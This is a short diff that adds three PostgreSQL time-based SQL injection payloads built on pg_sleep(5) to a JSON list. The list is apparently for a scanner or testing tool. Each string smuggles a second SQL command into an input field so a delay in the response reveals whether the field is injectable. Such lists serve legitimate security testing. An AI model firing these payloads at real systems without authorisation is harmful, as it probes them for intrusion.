@@ -122,5 +122,17 @@
   {
     "name": "postgresql",
     "payload": ")) or pg_sleep(5)--"
+  },
+  {
+    "name": "postgresql",
+    "payload": "select 1 from pg_sleep(5)"
+  },
+  {
+    "name": "postgresql",
+    "payload": ";(select 1 from pg_sleep(5))"
+  },
+  {
+    "name": "postgresql",
+    "payload": "||(select 1 from pg_sleep(5))"
   }
 ]
